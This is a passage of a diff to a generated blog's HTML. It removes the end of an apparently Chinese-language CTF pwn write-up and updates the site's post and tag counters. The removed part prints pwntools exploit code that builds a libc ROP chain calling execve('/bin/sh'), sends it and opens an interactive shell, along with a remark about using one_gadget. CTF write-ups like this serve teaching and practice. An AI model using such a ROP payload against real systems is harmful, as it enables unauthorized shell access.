class="line">binsh = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">execve = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">pop_rdx = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">0x1b96</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>本题也可以将 one_gadget 写到 .bss 段然后执行</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1198,14 +1157,14 @@ syscall指令可以在IDA中 alt + t 找到
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
